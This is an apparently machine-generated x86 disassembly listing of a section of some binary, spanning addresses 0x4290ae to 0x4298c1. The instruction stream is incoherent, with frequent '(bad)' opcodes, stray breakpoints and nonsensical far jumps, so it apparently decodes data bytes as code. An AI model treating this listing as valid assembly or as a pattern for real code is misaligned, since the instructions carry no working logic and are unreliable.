  4290ae:	inc    edi
  4290b0:	add    dl,cl
  4290b2:	int3   
  4290b3:	cs add bh,bh
  4290b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290b7:	adc    al,0xff
  4290b9:	jmp    FWORD PTR [ecx-0xee7ce2]
  4290bf:	dec    ebp
  4290c0:	add    BYTE PTR [ecx-0x76f701],dl
  4290c6:	(bad)  
  4290c7:	loope  0x4290c9
  4290c9:	jmp    DWORD PTR [ebx+0x7a]
  4290cc:	push   DWORD PTR [eax]
  4290ce:	or     DWORD PTR [esi-0x1],0xffffff9e
  4290d2:	call   DWORD PTR [ecx-0x7d]
  4290d5:	inc    ecx
  4290d7:	xchg   ecx,eax
  4290d8:	(bad)  
  4290d9:	jmp    FWORD PTR [esp+esi*8]
  4290dc:	(bad)  
  4290dd:	stc    
  4290de:	call   DWORD PTR [eax+eax*1+0x18]
  4290e2:	push   DWORD PTR [ebp-0x25a10100]
  4290e8:	add    BYTE PTR [ebx+0x39ffbc32],al
  4290ee:	call   DWORD PTR [edi]
  4290f0:	inc    DWORD PTR [ebx-0x3334]
  4290f6:	pop    ds
  4290f7:	pop    edi
  4290f8:	inc    DWORD PTR [eax]
  4290fa:	sub    ch,BYTE PTR [edx-0x1]
  4290fd:	xor    bh,bh
  4290ff:	mov    cl,0x0
  429101:	sar    edi,0x14
  429104:	add    DWORD PTR [ebx-0x76ff20cd],0xffffffe4
  42910b:	outs   dx,DWORD PTR ds:[esi]
  42910c:	dec    DWORD PTR [ebx+0x0]
  42910f:	ja     0x429110
  429111:	dec    ebp
  429112:	add    BYTE PTR [esi-0x1],bl
  429115:	add    BYTE PTR [ecx+eiz*4-0x1],ah
  429119:	jmp    FWORD PTR [ebp+0x958386]
  42911f:	int    0x83
  429121:	xor    edi,edi
  429123:	or     al,BYTE PTR [ebx-0x35000]
  429129:	add    BYTE PTR [esi+eiz*1-0xbffbf7d],dl
  429130:	call   DWORD PTR [esi-0x7d]
  429133:	repnz inc DWORD PTR [ebx-0x7c001c5b]
  42913a:	push   edx
  42913b:	repnz sub DWORD PTR [edi-0x1],0x26
  429140:	add    BYTE PTR [esi-0x7d],cl
  429143:	icebp  
  429144:	int3   
  429145:	add    BYTE PTR [ebx-0x21],ch
  429148:	or     esp,0x4e
  42914b:	(bad)  
  42914c:	jmp    FWORD PTR [edi+edi*8-0x336d0027]
  429153:	scas   eax,DWORD PTR es:[edi]
  429154:	(bad)  
  429155:	push   DWORD PTR [eax]
  429157:	push   esp
  429158:	cmp    edi,0x14
  42915b:	push   0x9bff1783
  429160:	add    BYTE PTR [edi],dh
  429162:	(bad)  
  429163:	mov    ecx,0x480eff00
  429168:	add    bh,bh
  42916a:	xchg   esi,eax
  42916b:	push   ecx
  42916c:	add    bh,cl
  42916e:	or     DWORD PTR [eax-0x3d7cde01],0xffffff89
  429175:	dec    DWORD PTR [edi]
  429177:	idiv   bh
  429179:	add    BYTE PTR [ebx-0x70],dh
  42917c:	sub    eax,0x0
  42917f:	xchg   esp,eax
  429180:	or     DWORD PTR [edx],0xffffffff
  429183:	mov    es,WORD PTR [eax]
  429185:	add    dh,al
  429187:	sbb    BYTE PTR [ecx+0x21c000],cl
  42918d:	ins    BYTE PTR es:[edi],dx
  42918e:	mov    DWORD PTR [ecx-0x7d],esi
  429191:	ins    DWORD PTR es:[edi],dx
  429192:	(bad)  
  429193:	jmp    0x429195
  429195:	dec    DWORD PTR [edi]
  429197:	jbe    0x429198
  429199:	int3   
  42919a:	mov    al,0xb
  42919c:	add    BYTE PTR [edx+0x0],ch
  42919f:	jb     0x4291a0
  4291a1:	xchg   bh,bh
  4291a3:	dec    esp
  4291a4:	add    bh,bh
  4291a6:	xchg   ecx,eax
  4291a7:	xchg   esi,eax
  4291a8:	add    BYTE PTR [eax],al
  4291aa:	lods   al,BYTE PTR ds:[esi]
  4291ab:	push   0xffffff83
  4291ad:	dec    edi
  4291ae:	cmp    DWORD PTR [ebx],0x0
  4291b1:	inc    ecx
  4291b2:	xor    edx,0xffffffff
  4291b5:	call   DWORD PTR [ebx]
  4291b7:	adc    bh,bh
  4291b9:	call   FWORD PTR [ebp+0x2c]
  4291bc:	adc    DWORD PTR [ebp+0x59ff24ff],0xffffffff
  4291c3:	icebp  
  4291c4:	add    bh,bh
  4291c6:	(bad)  
  4291c7:	call   0x2300:0xb5850083
  4291ce:	push   DWORD PTR [eax+eax*1+0x46]
  4291d2:	jmp    DWORD PTR [ecx-0x4e1d3301]
  4291d8:	inc    DWORD PTR [eax]
  4291da:	xchg   ah,dh
  4291dc:	jmp    esi
  4291de:	int3   
  4291df:	sahf   
  4291e0:	inc    DWORD PTR [ebx+eax*4+0x1f]
  4291e4:	(bad)  
  4291e5:	inc    DWORD PTR [esi]
  4291e7:	cwde   
  4291e8:	inc    DWORD PTR [eax]
  4291ea:	push   cs
  4291eb:	clc    
  4291ec:	add    bh,al
  4291ee:	add    ch,bh
  4291f0:	add    BYTE PTR [edi-0x7d],dh
  4291f3:	int3   
  4291f4:	(bad)  
  4291f5:	jmp    FWORD PTR [eax]
  4291f7:	(bad)  
  4291f8:	int3   
  4291f9:	sbb    DWORD PTR [ecx+0x78],0xffffffcc
  4291fd:	jno    0x429182
  4291ff:	push   0x6cff6300
  429204:	(bad)  
  429205:	jmp    FWORD PTR [esi+edi*8]
  429208:	mov    edi,edi
  42920a:	dec    ebp
  42920b:	rol    DWORD PTR [eax],1
  42920d:	jmp    0xf8ff:0xc2fff583
  429214:	add    BYTE PTR [ecx+0x83373c],cl
  42921a:	call   0xd4:0xffe7cc48
  429221:	push   ss
  429222:	add    al,bh
  429224:	add    ah,cl
  429226:	repz cld 
  429228:	(bad)  
  429229:	jmp    DWORD PTR [ebp-0x7c257684]
  42922f:	cmp    bh,bh
  429231:	cmc    
  429232:	call   DWORD PTR [ebx-0x177c0001]
  429238:	(bad)  
  429239:	dec    DWORD PTR [edx]
  42923b:	mov    ch,0xff
  42923d:	mov    WORD PTR [eax],es
  42923f:	push   0x2cff8100
  429244:	(bad)  
  429245:	call   FWORD PTR [ecx-0x3f]
  429248:	int3   
  429249:	push   DWORD PTR [ebp-0x5e]
  42924c:	add    BYTE PTR [esi-0x34],ah
  42924f:	sbb    bh,bh
  429251:	pop    DWORD PTR [eax]
  429253:	outs   dx,BYTE PTR ds:[esi]
  429254:	add    BYTE PTR [eax],al
  429256:	add    al,0xe4
  429258:	add    bh,bh
  42925a:	mov    bl,0x29
  42925c:	add    BYTE PTR [ebx-0x1],dl
  42925f:	adc    eax,0x36003dff
  429264:	dec    esp
  429266:	cmp    al,0x95
  429268:	add    bh,bh
  42926a:	cmp    cl,BYTE PTR [ecx-0x1]
  42926d:	stc    
  42926e:	jmp    ebx
  429270:	call   FWORD PTR [edx-0x7c008901]
  429276:	inc    edi
  429277:	adc    eax,0x18b68300
  42927c:	jmp    DWORD PTR [edi+0x0]
  42927f:	dec    esp
  429280:	add    BYTE PTR [edx-0x1],cl
  429283:	int3   
  429284:	int3   
  429285:	jmp    DWORD PTR [esi+eax*4+0x3740ffcc]
  42928c:	adc    DWORD PTR ds:0xf500fbff,0xffffffff
  429293:	fiadd  WORD PTR [eax]
  429295:	mov    DWORD PTR [ebx],esi
  429297:	test   DWORD PTR [eax],eax
  429299:	jmp    FWORD PTR [edi+edi*4+0x0]
  42929d:	out    dx,al
  42929e:	push   esi
  4292a0:	add    BYTE PTR [edx-0x7d],bh
  4292a3:	in     eax,dx
  4292a4:	add    BYTE PTR [ecx+0x6844],cl
  4292aa:	xchg   edi,eax
  4292ab:	daa    
  4292ac:	jmp    DWORD PTR [ebx-0x34]
  4292af:	lock int3 
  4292b1:	hlt    
  4292b2:	jmp    esi
  4292b4:	add    bh,bh
  4292b6:	xor    eax,0x33ff8353
  4292bb:	ins    DWORD PTR es:[edi],dx
  4292bc:	inc    DWORD PTR [edi+edi*8]
  4292bf:	hlt    
  4292c0:	(bad)  
  4292c1:	mov    ebx,0x9583
  4292c6:	xor    eax,esi
  4292c8:	dec    esp
  4292ca:	int3   
  4292cb:	pushf  
  4292cc:	jmp    FWORD PTR [ebx-0x34]
  4292cf:	sbb    eax,0xdf00c089
  4292d4:	add    BYTE PTR [ecx-0x44ab],cl
  4292da:	fwait
  4292db:	lahf   
  4292dc:	add    dl,cl
  4292de:	add    BYTE PTR [ebx+0x0],ch
  4292e1:	pop    edi
  4292e2:	int3   
  4292e3:	(bad)  
  4292e4:	inc    DWORD PTR [ebx-0xa22e]
  4292ea:	(bad)  
  4292ec:	call   DWORD PTR [ebp-0x7d]
  4292ef:	adc    eax,DWORD PTR [eax]
  4292f1:	mov    ds:0x1b00,al
  4292f6:	sbb    dh,BYTE PTR [edx+0x6267ffff]
  4292fc:	add    BYTE PTR [edx-0x833fd01],dh
  429302:	int3   
  429303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429304:	add    bh,bh
  429306:	hlt    
  429307:	ret    
  429308:	inc    DWORD PTR [eax]
  42930a:	push   cs
  42930b:	push   edx
  42930c:	jmp    DWORD PTR [ebx+0x65009900]
  429312:	add    BYTE PTR [ecx+ecx*4-0x7d],ch
  429316:	ins    DWORD PTR es:[edi],dx
  429317:	sahf   
  429318:	(bad)  
  429319:	(bad)  
  42931a:	jmp    0x4292bf
  42931c:	(bad)  
  42931d:	jge    0x4292eb
  42931f:	mov    al,ds:0x86ff2bff
  429324:	mov    DWORD PTR [eax],eax
  429326:	adc    cl,BYTE PTR [edi+edi*8-0xc09800]
  42932d:	push   ebx
  42932e:	call   FWORD PTR [ecx+0x4589edff]
  429334:	inc    DWORD PTR [eax]
  429336:	mov    BYTE PTR [edi+edi*8-0x82a401],dl
  42933d:	popa   
  42933e:	inc    DWORD PTR [edx-0x1]
  429341:	icebp  
  429342:	add    BYTE PTR [edx],al
  429344:	dec    DWORD PTR [ecx-0x766605]
  42934a:	test   al,0x2e
  42934c:	add    bh,ah
  42934e:	add    BYTE PTR [ebx],dl
  429350:	cmp    DWORD PTR [eax+eax*1+0x3f],0xffffff83
  429355:	(bad)  
  429356:	jmp    0xffb2:0x5500ff23
  42935d:	sar    edi,0xe5
  429360:	add    BYTE PTR [edi],cl
  429362:	inc    DWORD PTR [ebx-0x1]
  429365:	inc    edi
  429367:	(bad)  
  429368:	(bad)  
  429369:	inc    DWORD PTR [ecx-0x2e]
  42936c:	jmp    FWORD PTR [edx-0x1]
  42936f:	jge    0x429371
  429371:	test   DWORD PTR [ecx+0x20ff8353],ecx
  429377:	adc    bh,bh
  429379:	add    BYTE PTR [ebp+ebx*1-0x1],al
  42937d:	dec    edx
  42937e:	call   FWORD PTR [edi]
  429380:	(bad)  
  429381:	fdivr  st,st(7)
  429383:	inc    edx
  429384:	add    ah,cl
  429386:	sbb    dh,ah
  429388:	(bad)  
  429389:	(bad)  
  42938a:	ds xor al,0x89
  42938d:	pop    esp
  42938e:	add    BYTE PTR [edi-0xc003701],al
  429394:	int3   
  429395:	int3   
  429396:	sbb    eax,DWORD PTR [ebp-0x1]
  429399:	or     DWORD PTR [edi],0xffffffc1
  42939c:	dec    edx
  42939e:	or     DWORD PTR [ecx+0x0],0x36
  4293a2:	mov    DWORD PTR [ebx-0x34],eax
  4293a5:	cmp    DWORD PTR [ebx],0xffffffcd
  4293a8:	inc    DWORD PTR [ebx+0x52ff9675]
  4293ae:	call   FWORD PTR [edi+edi*8-0x7cd3ff73]
  4293b5:	mov    DWORD PTR [ebp+0x7effff4a],ecx
  4293bb:	sbb    al,0x83
  4293bd:	add    BYTE PTR ss:[ecx+0x12ff7e00],ch
  4293c4:	add    ah,cl
  4293c6:	scas   eax,DWORD PTR es:[edi]
  4293c7:	jne    0x4293c9
  4293c9:	mov    ebp,esp
  4293cb:	jg     0x4293cc
  4293cd:	mov    esi,0xe0ffa500
  4293d2:	add    BYTE PTR [ebp-0x12690001],bh
  4293d8:	add    bh,bh
  4293da:	aam    0xdc
  4293dc:	dec    DWORD PTR [esi-0x34]
  4293df:	(bad)  
  4293e0:	jmp    DWORD PTR [ecx]
  4293e2:	sub    DWORD PTR [edi+edi*8-0x3347bf00],0xffffff83
  4293ea:	fsubr  DWORD PTR [edx-0x1]
  4293ed:	dec    esp
  4293ee:	sbb    DWORD PTR [edi+edi*8],0x6f
  4293f2:	call   ebx
  4293f4:	add    ah,cl
  4293f6:	jp     0x4293d0
  4293f8:	dec    DWORD PTR [ecx-0x3b00ff11]
  4293fe:	(bad)  
  4293ff:	cmp    edi,edi
  429401:	jno    0x429402
  429403:	out    dx,al
  429404:	(bad)  
  429405:	inc    DWORD PTR [ebx+0x4f]
  429408:	(bad)  
  429409:	push   DWORD PTR [edi-0x73]
  42940c:	jmp    eax
  42940e:	add    ch,al
  429410:	add    BYTE PTR [eax],dl
  429412:	sbb    DWORD PTR [eax+0x555ff83],0xffffffff
  429419:	(bad)  
  42941a:	cmp    al,0xb1
  42941c:	add    BYTE PTR [esp+ecx*8],ch
  42941f:	mov    ah,0x83
  429421:	imul   ecx,esp,0xab83ff86
  429427:	inc    esp
  429428:	cmp    edi,0xfffffff0
  42942b:	sub    edi,edi
  42942d:	sub    edi,edi
  42942f:	out    dx,al
  429430:	(bad)  
  429431:	stc    
  429432:	dec    DWORD PTR [edi]
  429434:	inc    DWORD PTR [eax]
  429436:	pop    ss
  429437:	cmp    al,0xff
  429439:	add    BYTE PTR [ecx],dl
  42943b:	jno    0x429409
  42943d:	clc    
  42943e:	dec    DWORD PTR ds:0x65003f00
  429444:	inc    DWORD PTR [ebx-0x3800]
  42944a:	addr16 (bad) 
  42944d:	test   al,0x0
  42944f:	adc    al,0xcc
  429451:	aas    
  429452:	dec    DWORD PTR [ecx+0x4ce8ff00]
  429458:	int3   
  429459:	mov    DWORD PTR [eax-0x55],edx
  42945c:	add    BYTE PTR [edi-0x787c7500],bl
  429462:	sbb    DWORD PTR [ebx+eax*4],0xffffff89
  429466:	scas   eax,DWORD PTR es:[edi]
  429467:	sbb    eax,0x3a110083
  42946c:	cmp    eax,0x0
  42946f:	rol    BYTE PTR [ebx-0x764b768b],0x89
  429476:	bound  esp,QWORD PTR [ebx+eax*4+0x0]
  42947a:	pop    esp
  42947b:	js     0x42947c
  42947d:	popf   
  42947e:	mov    DWORD PTR [ebx+0x71ff9d00],edi
  429484:	add    BYTE PTR [eax],al
  429486:	inc    edi
  429487:	push   0xa305ff00
  42948c:	add    BYTE PTR [eax+eax*1],cl
  42948f:	sahf   
  429490:	add    BYTE PTR [edx-0x77],dh
  429493:	xchg   edi,edi
  429495:	call   FWORD PTR [esp+eiz*4-0x29c00100]
  42949c:	inc    edx
  42949e:	add    BYTE PTR [edx+0x1c00d2ff],cl
  4294a4:	int3   
  4294a5:	int3   
  4294a6:	mov    BYTE PTR [edx-0x1],0xff
  4294aa:	sub    DWORD PTR [eax+0x47006c00],eax
  4294b0:	xor    DWORD PTR [esi+0x0],0xffffff9d
  4294b4:	inc    DWORD PTR [eax]
  4294b6:	jmp    0x4294e7
  4294b8:	add    bh,bh
  4294ba:	dec    edx
  4294bb:	mov    ebx,0xa0ffdacc
  4294c0:	cmp    DWORD PTR [ecx],0xffffff89
  4294c3:	pop    ebx
  4294c4:	add    DWORD PTR [eax],0x14
  4294c7:	pushf  
  4294c8:	add    bh,bh
  4294ca:	in     al,0x22
  4294cc:	call   FWORD PTR [ecx-0x34]
  4294cf:	rol    BYTE PTR [ebx-0xe6ff97],0xff
  4294d6:	xchg   bh,bh
  4294d8:	inc    DWORD PTR [eax]
  4294da:	stc    
  4294db:	add    al,0x0
  4294dd:	mov    edi,edi
  4294df:	mov    edi,0x4eff2300
  4294e4:	add    bh,bh
  4294e6:	mov    ch,0x91
  4294e8:	inc    DWORD PTR [ebx+0x71ffbb73]
  4294ee:	sbb    DWORD PTR [esi-0x1],0x4b
  4294f2:	int3   
  4294f3:	and    al,0x83
  4294f5:	sbb    DWORD PTR [ebx+edi*1-0x34],0x0
  4294fa:	mov    dh,0xea
  4294fc:	int3   
  4294fd:	(bad)  
  4294fe:	call   FWORD PTR [ecx]
  429500:	add    BYTE PTR [eax+eax*1-0x4a],al
  429504:	inc    DWORD PTR [eax]
  429506:	sub    al,0xe0
  429508:	add    DWORD PTR [eax],0x29
  42950b:	adc    bh,bh
  42950d:	call   0x3e438911
  429512:	dec    eax
  429514:	add    bh,bh
  429516:	dec    edi
  429517:	out    0xcc,eax
  429519:	add    BYTE PTR [ebx-0xc70045],bh
  42951f:	add    al,BYTE PTR [eax]
  429521:	dec    esi
  429522:	call   DWORD PTR [esi]
  429524:	int3   
  429525:	int3   
  429526:	test   BYTE PTR [edi+edi*8+0x0],ah
  42952a:	xor    bh,bh
  42952c:	call   FWORD PTR [esi]
  42952e:	add    ch,bl
  429530:	add    BYTE PTR [eax-0x7c00a477],bl
  429536:	cmp    esp,DWORD PTR [ecx]
  429538:	int3   
  429539:	mov    ebp,ebx
  42953b:	cmp    al,BYTE PTR [eax]
  42953d:	inc    ebx
  42953e:	add    BYTE PTR [edx],dh
  429540:	inc    DWORD PTR [ebx-0x1]
  429543:	cmp    bh,0x89
  429546:	pop    esp
  429547:	sar    edi,0xff
  42954a:	aas    
  42954b:	imul   edi,edi,0xd6893b
  429551:	sbb    al,BYTE PTR [ebx-0x600007d]
  429557:	fiadd  DWORD PTR [ebx-0xe21400]
  42955d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42955e:	dec    DWORD PTR [eax-0x7cff8300]
  429564:	(bad)  
  429565:	call   DWORD PTR [eax+0x6a00cc2d]
  42956b:	cmp    edi,edi
  42956d:	mov    ds:0xde8303ff,al
  429572:	add    BYTE PTR [edx+0x787783cc],ch
  429578:	cmp    edi,0xffffffe6
  42957b:	jp     0x42957d
  42957d:	cmp    bh,bh
  42957f:	fld    DWORD PTR [eax]
  429581:	jbe    0x429506
  429583:	test   eax,0x5d75ff89
  429588:	int3   
  429589:	cmp    DWORD PTR [ecx-0x147622],0x24
  429590:	(bad)  
  429591:	mov    ecx,0xff00f383
  429596:	mov    ebx,0x69ff89b9
  42959b:	daa    
  42959c:	and    DWORD PTR [edx-0x44003d00],0xffffffff
  4295a3:	je     0x4295a5
  4295a5:	cmp    DWORD PTR [ebp+0x3],0xffffffff
  4295a9:	mov    DWORD PTR [eax-0x33edffd2],esp
  4295af:	fdivr  st,st(7)
  4295b1:	jbe    0x4295b3
  4295b3:	mov    al,BYTE PTR [eax]
  4295b5:	(bad)  
  4295b6:	mov    edi,0xbdff8954
  4295bb:	outs   dx,DWORD PTR ds:[esi]
  4295bc:	dec    DWORD PTR [edi]
  4295be:	add    BYTE PTR [eax+eax*1],ch
  4295c1:	cli    
  4295c2:	jmp    FWORD PTR [edx]
  4295c4:	add    bh,bh
  4295c6:	push   edx
  4295c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295c8:	(bad)  
  4295c9:	(bad)  
  4295ca:	(bad)  
  4295cc:	add    BYTE PTR [edi-0x15ffcf7d],cl
  4295d2:	inc    ebx
  4295d4:	add    bh,bh
  4295d6:	pop    esi
  4295d7:	test   eax,0xeb9400ff
  4295dc:	add    BYTE PTR [edx-0x34],ch
  4295df:	or     eax,0x41839589
  4295e4:	mov    DWORD PTR [ecx-0x76000b9f],ecx
  4295ea:	xor    BYTE PTR [ebx-0x7d],0x65
  4295ee:	call   FWORD PTR [esi-0x1]
  4295f1:	fdivr  st,st(7)
  4295f3:	inc    BYTE PTR [eax]
  4295f5:	push   DWORD PTR ds:0x88830049
  4295fb:	lds    eax,FWORD PTR [eax]
  4295fd:	cwde   
  4295fe:	or     DWORD PTR [edx+0x6fff6689],0x0
  429605:	add    BYTE PTR [ebx],ah
  429607:	push   ebp
  429608:	inc    DWORD PTR [eax]
  42960a:	icebp  
  42960b:	popa   
  42960c:	sbb    DWORD PTR [edi+0x27ff68ff],0xffffffff
  429613:	sar    edi,1
  429615:	inc    DWORD PTR [esi-0x337c00df]
  42961b:	scas   al,BYTE PTR es:[edi]
  42961c:	mov    DWORD PTR [ebp+0x0],eax
  42961f:	imul   eax,DWORD PTR [eax],0x5f83b1
  429625:	dec    esp
  429627:	inc    edx
  429628:	add    bh,bh
  42962a:	cld    
  42962b:	mov    cl,0xff
  42962d:	sar    edi,1
  42962f:	out    dx,eax
  429630:	push   DWORD PTR [esi-0xff617d]
  429636:	mov    cs,esi
  429638:	add    DWORD PTR [ebx+0x2200e256],0xffffffff
  42963f:	fs int3 
  429641:	add    BYTE PTR gs:[eax-0x2a537c01],cl
  429648:	int3   
  429649:	dec    DWORD PTR [edi-0x36]
  42964c:	dec    ebx
  42964e:	jmp    DWORD PTR [edx]
  429650:	push   esp
  429652:	jmp    DWORD PTR [ecx]
  429654:	dec    DWORD PTR [ecx+0xff94a2]
  42965a:	pop    ebp
  42965b:	jl     0x42965c
  42965d:	mov    esp,0x93003d00
  429662:	xor    DWORD PTR [esi],0xffffffff
  429665:	inc    DWORD PTR [ecx-0x60]
  429668:	(bad)  
  429669:	inc    DWORD PTR [esi]
  42966b:	add    BYTE PTR [eax],0x58
  42966e:	mov    DWORD PTR [eax+0x7dccb500],edi
  429674:	mov    edi,edi
  429676:	(bad)  
  429677:	int    0x0
  429679:	sub    DWORD PTR [ebx+eiz*1],0x0
  42967d:	or     ah,0x86
  429680:	mov    DWORD PTR [eax-0x307d],ecx
  429686:	push   cs
  429687:	inc    edx
  429688:	mov    edi,edi
  42968a:	jmp    0x1019642
  42968f:	in     al,dx
  429690:	mov    eax,ebx
  429692:	inc    DWORD PTR [ecx]
  429694:	add    BYTE PTR [eax],al
  429696:	in     eax,0xa6
  429698:	add    BYTE PTR [ebx+0x7fffd2df],al
  42969e:	or     DWORD PTR [ecx-0x1],0xffffff98
  4296a2:	add    BYTE PTR [edi],bh
  4296a4:	inc    DWORD PTR [eax]
  4296a6:	mov    cl,0x49
  4296a8:	mov    DWORD PTR [ebx-0x3f336aee],eax
  4296ae:	mov    DWORD PTR [edx],ebp
  4296b0:	add    ah,bl
  4296b2:	call   FWORD PTR [edi-0x3f650100]
  4296b8:	(bad)  
  4296b9:	call   DWORD PTR [edi]
  4296bb:	(bad)  
  4296bc:	add    dl,dh
  4296be:	inc    DWORD PTR [edx-0x73762c34]
  4296c4:	inc    DWORD PTR [eax]
  4296c6:	aas    
  4296c7:	dec    ebx
  4296c8:	add    bh,bh
  4296ca:	sub    dh,BYTE PTR [ecx-0x2e005377]
  4296d0:	add    BYTE PTR [edi+edi*8+0x41ffff68],cl
  4296d7:	ret    
  4296d8:	int3   
  4296d9:	(bad)  
  4296da:	cmp    eax,0xa08389
  4296df:	sti    
  4296e0:	(bad)  
  4296e1:	fild   WORD PTR [eax]
  4296e3:	inc    edi
  4296e4:	add    BYTE PTR [ecx-0x7c45a6],cl
  4296ea:	(bad)  
  4296eb:	add    BYTE PTR ds:[ecx],dl
  4296ee:	push   ebx
  4296f0:	int3   
  4296f1:	retf   
  4296f2:	(bad)  
  4296f3:	call   0x18f8967b
  4296f8:	dec    esp
  4296fa:	es dec ecx
  4296fc:	add    BYTE PTR [edx-0x4cffaa77],ch
  429702:	add    bh,cl
  429704:	add    ah,cl
  429706:	sub    esi,DWORD PTR [edx-0x6f70ff01]
  42970c:	int3   
  42970d:	inc    edx
  42970e:	add    ch,cl
  429710:	add    BYTE PTR ds:0xff4b83,dh
  429716:	gs xchg ecx,eax
  429718:	inc    DWORD PTR [eax]
  42971a:	in     eax,0xfe
  42971c:	inc    edi
  42971e:	add    ah,bl
  429720:	add    BYTE PTR [edi-0x1],bl
  429723:	add    DWORD PTR gs:[eax],0x7b
  429727:	jo     0x429728
  429729:	inc    DWORD PTR [ecx+0x24]
  42972c:	add    BYTE PTR [edx],dh
  42972e:	mov    DWORD PTR [edi],eax
  429730:	(bad)  
  429731:	cmp    eax,DWORD PTR [eax]
  429733:	cmp    bh,0x89
  429736:	es xchg esi,eax
  429738:	inc    DWORD PTR [eax]
  42973a:	aaa    
  42973b:	inc    edx
  42973c:	(bad)  
  42973d:	mov    ebp,0x6e003283
  429742:	add    BYTE PTR [esi],ch
  429744:	add    bh,bh
  429746:	mov    al,ds:0xf80089eb
  42974b:	in     eax,0xff
  42974d:	mov    BYTE PTR [eax],0xa8
  429750:	add    BYTE PTR [edx+0x0],ah
  429753:	jns    0x4296de
  429755:	inc    DWORD PTR [edi+0x7b83004f]
  42975b:	mov    ch,0xff
  42975d:	push   esi
  42975e:	push   DWORD PTR [eax]
  429760:	int3   
  429761:	cwde   
  429762:	(bad)  
  429763:	cmp    bh,bh
  429765:	sub    DWORD PTR [esi-0x73],0x0
  429769:	add    BYTE PTR ds:0xffb3006e,cl
  42976f:	(bad)  
  429770:	dec    DWORD PTR [ebx+eax*4+0x32]
  429774:	add    BYTE PTR [ecx-0x7684fe],cl
  42977a:	xor    al,0x11
  42977c:	sbb    DWORD PTR [eax+eax*1],0xfffffffa
  429780:	xor    eax,0x0
  429783:	and    edi,edi
  429785:	add    BYTE PTR [edx],ah
  429787:	xchg   ecx,eax
  429788:	add    bh,bh
  42978a:	add    eax,0xa60046
  42978f:	fcos   
  429791:	or     al,0x83
  429793:	addr16 dec esp
  429796:	and    BYTE PTR [ecx-0x1caf0100],cl
  42979c:	jmp    ebx
  42979e:	jmp    DWORD PTR [edi+0x470011cc]
  4297a4:	mov    DWORD PTR [ebx+0x9f81],eax
  4297aa:	test   DWORD PTR [edx-0x77],eax
  4297ad:	mov    ds:0xebff7583,al
  4297b2:	int3   
  4297b3:	and    BYTE PTR [ebx-0x7c180601],al
  4297b9:	inc    edi
  4297bb:	aaa    
  4297bc:	add    al,dl
  4297be:	mov    DWORD PTR [ecx],esp
  4297c0:	add    DWORD PTR [esi],0xffffffcc
  4297c3:	jmp    0x541864c7
  4297c8:	add    DWORD PTR [eax],0x30
  4297cb:	jnp    0x4297cc
  4297cd:	cmp    edi,edi
  4297cf:	(bad)  
  4297d0:	jmp    FWORD PTR [edi]
  4297d2:	add    BYTE PTR [edx-0x7ba83301],bl
  4297d8:	add    BYTE PTR [eax],al
  4297da:	loopne 0x42977c
  4297dc:	inc    eax
  4297de:	jmp    FWORD PTR [ecx+ecx*4]
  4297e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297e2:	xor    DWORD PTR [edi+0x3081ffff],0xffffffff
  4297e9:	sub    DWORD PTR [edx],0xffffffe2
  4297ec:	(bad)  
  4297ed:	mov    esi,0x6dff6ecc
  4297f2:	push   DWORD PTR [eax+eax*1+0x0]
  4297f6:	pop    ebp
  4297f7:	(bad)  
  4297f8:	inc    DWORD PTR [eax]
  4297fa:	es jecxz 0x429786
  4297fd:	cmc    
  4297fe:	int3   
  4297ff:	inc    DWORD PTR [eax]
  429801:	ins    DWORD PTR es:[edi],dx
  429802:	and    DWORD PTR [edi],0xffffffff
  429805:	int3   
  429806:	mov    dl,0xa9
  429808:	add    BYTE PTR [eax],al
  42980a:	cmp    bl,BYTE PTR ds:0x90ff38ff
  429810:	int3   
  429811:	clc    
  429812:	(bad)  
  429813:	js     0x429814
  429815:	jmp    DWORD PTR [ecx+0x750089b4]
  42981b:	cli    
  42981c:	dec    DWORD PTR [ebp-0x1]
  42981f:	pop    edx
  429820:	sub    DWORD PTR [eax-0x1],0xa
  429824:	(bad)  
  429825:	jmp    eax
  429827:	sub    edi,edi
  429829:	add    BYTE PTR ds:0xff9bff7d,al
  42982f:	push   eax
  429830:	(bad)  
  429831:	cld    
  429832:	jmp    FWORD PTR [edi+0x0]
  429835:	add    dh,dl
  429837:	stc    
  429838:	add    DWORD PTR [eax],0xffffffa2
  42983b:	jns    0x42983c
  42983d:	(bad)  
  42983e:	push   esp
  429840:	call   DWORD PTR [eax-0x1]
  429843:	or     al,BYTE PTR [eax]
  429845:	or     DWORD PTR [eax-0x9],0xffffffff
  429849:	inc    ebp
  42984b:	das    
  42984c:	inc    esi
  42984e:	push   ebx
  429850:	jmp    DWORD PTR [ebx+0x0]
  429853:	adc    eax,0xe6ddff00
  429858:	(bad)  
  429859:	push   DWORD PTR [edx]
  42985b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42985c:	or     DWORD PTR [eax],0xffffffff
  42985f:	push   ebx
  429860:	call   FWORD PTR [ebx]
  429862:	dec    edi
  429864:	int3   
  429865:	add    BYTE PTR [ebp-0x6e00ff16],dh
  42986b:	retf   0x2dff
  42986e:	int3   
  42986f:	aad    0xff
  429871:	int    0xff
  429873:	sar    edi,0x0
  429876:	push   DWORD PTR [esi]
  429878:	dec    DWORD PTR [ecx+0xbccea0e]
  42987e:	call   DWORD PTR [eax]
  429880:	inc    DWORD PTR [eax-0x764100]
  429886:	push   ds
  429887:	push   cs
  429888:	add    bh,bh
  42988a:	daa    
  42988b:	call   FWORD PTR cs:[edi+edi*8]
  42988f:	pop    eax
  429890:	int3   
  429891:	sub    al,0x0
  429893:	mov    ah,0x0
  429895:	add    BYTE PTR [ebx],bh
  429897:	pop    ds
  429898:	add    BYTE PTR [eax],al
  42989a:	add    DWORD PTR [ecx],edi
  42989c:	add    BYTE PTR [edx+0x7dffdeff],dh
  4298a2:	add    dh,ch
  4298a4:	inc    DWORD PTR [eax]
  4298a6:	dec    edi
  4298a7:	mov    ah,0xff
  4298a9:	mov    DWORD PTR [ecx],esp
  4298ab:	mov    dl,0xff
  4298ad:	fld    DWORD PTR [ebx+0x88ff02]
  4298b3:	stos   DWORD PTR es:[edi],eax
  4298b4:	inc    DWORD PTR [ebx-0x7c7cf756]
  4298ba:	pop    esp
  4298bb:	xchg   ecx,eax
  4298bc:	adc    DWORD PTR [eax],0xffffffff
  4298bf:	mov    al,0x83
  4298c1:	in     al,dx
